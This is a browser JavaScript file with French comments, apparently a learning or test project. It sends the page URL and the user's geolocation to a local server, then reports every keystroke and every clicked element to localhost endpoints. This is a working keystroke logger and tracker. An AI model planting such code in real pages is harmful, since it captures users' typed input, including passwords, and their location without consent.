const currentUrl = window.location.href

const data = {
    url: currentUrl
};

fetch('http://localhost:3000/url', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
})
.then(response => response.text())
.then(responseText => {
    console.log('Réponse du serveur :', responseText);
})
.catch(error => {
    console.error('Erreur lors de l\'envoi des données :', error);
});


// Fonction pour récupérer la localisation de l'utilisateur
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError);
    } else {
        console.log('La géolocalisation n\'est pas prise en charge par ce navigateur.');
    }
}

// Fonction de callback pour traiter la position récupérée
function showPosition(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    console.log('Latitude :', latitude);
    console.log('Longitude :', longitude);

    // Envoyer les données au serveur web si nécessaire
    const data = {
        latitude: latitude,
        longitude: longitude,
        timestamp: new Date().toISOString()
    };

    fetch('http://localhost:3000/location', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.text())
    .then(responseText => {
        console.log('Réponse du serveur :', responseText);
    })
    .catch(error => {
        console.error('Erreur lors de l\'envoi des données :', error);
    });
}

// Fonction de callback pour gérer les erreurs de géolocalisation
function showError(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            console.log('L\'utilisateur a refusé la demande de géolocalisation.');
            break;
        case error.POSITION_UNAVAILABLE:
            console.log('Les informations de localisation ne sont pas disponibles.');
            break;
        case error.TIMEOUT:
            console.log('La demande de géolocalisation a expiré.');
            break;
        case error.UNKNOWN_ERROR:
            console.log('Une erreur inconnue s\'est produite.');
            break;
    }
}

// Appeler la fonction pour récupérer la localisation au chargement de la page
getLocation();


document.addEventListener('keydown', (e) => {
    // console.log(e.key);

    const data = {
        key: e.key,
        time: new Date().getTime()
    };

    fetch('http://localhost:3000/key', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.text())
    .then(responseText => {
        console.log('Réponse du serveur :', responseText);
    })
    .catch(error => {
        console.error('Erreur lors de l\'envoi des données :', error);
    });
    
});

document.addEventListener('click', (e) => {
    console.log(e.target);


    const elementInfo = {
        tagName: e.target.tagName,
        id: e.target.id,
        classList: Array.from(e.target.classList) // Convertit la liste des classes en tableau
    };

    // Crée l'objet de données à envoyer
    const data = {
        target: elementInfo,
        time: new Date().getTime()
    };

    fetch('http://localhost:3000/click', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.text())
    .then(responseText => {
        console.log('Réponse du serveur :', responseText);
    })
    .catch(error => {
        console.error('Erreur lors de l\'envoi des données :', error);
    });
    
});
